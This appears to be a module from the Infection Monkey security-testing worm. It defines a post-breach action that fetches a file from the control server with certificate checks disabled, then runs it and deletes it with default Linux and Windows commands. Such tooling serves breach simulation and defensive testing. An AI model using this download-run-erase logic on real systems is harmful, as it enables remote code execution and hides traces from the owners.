from infection_monkey.post_breach.pba import PBA
from infection_monkey.control import ControlClient
from infection_monkey.config import WormConfiguration
from infection_monkey.utils import get_monkey_dir_path
import requests
import os
import logging

LOG = logging.getLogger(__name__)

__author__ = 'VakarisZ'

# Default commands for executing PBA file and then removing it
DEFAULT_LINUX_COMMAND = "chmod +x {0} ; {0} ; rm {0}"
DEFAULT_WINDOWS_COMMAND = "{0} & del {0}"


class FileExecution(PBA):
    """
    Defines user's file execution post breach action.
    """
    def __init__(self, linux_command="", windows_command=""):
        self.linux_filename = WormConfiguration.PBA_linux_filename
        self.windows_filename = WormConfiguration.PBA_windows_filename
        super(FileExecution, self).__init__("File execution", linux_command, windows_command)

    def _execute_linux(self):
        FileExecution.download_PBA_file(get_monkey_dir_path(), self.linux_filename)
        return super(FileExecution, self)._execute_linux()

    def _execute_win(self):
        FileExecution.download_PBA_file(get_monkey_dir_path(), self.windows_filename)
        return super(FileExecution, self)._execute_win()

    def add_default_command(self, is_linux):
        """
        Replaces current (likely empty) command with default file execution command (that changes permissions, executes
        and finally deletes post breach file).
        Default commands are defined as globals in this module.
        :param is_linux: Boolean that indicates for which OS the command is being set.
        """
        if is_linux:
            file_path = os.path.join(get_monkey_dir_path(), self.linux_filename)
            self.linux_command = DEFAULT_LINUX_COMMAND.format(file_path)
        else:
            file_path = os.path.join(get_monkey_dir_path(), self.windows_filename)
            self.windows_command = DEFAULT_WINDOWS_COMMAND.format(file_path)

    @staticmethod
    def download_PBA_file(dst_dir, filename):
        """
        Handles post breach action file download
        :param dst_dir: Destination directory
        :param filename: Filename
        :return: True if successful, false otherwise
        """

        PBA_file_contents = requests.get("https://%s/api/pba/download/%s" %
                                         (WormConfiguration.current_server, filename),
                                         verify=False,
                                         proxies=ControlClient.proxies)
        try:
            with open(os.path.join(dst_dir, filename), 'wb') as written_PBA_file:
                written_PBA_file.write(PBA_file_contents.content)
            return True
        except IOError as e:
            LOG.error("Can not download post breach file to target machine, because %s" % e)
            return False
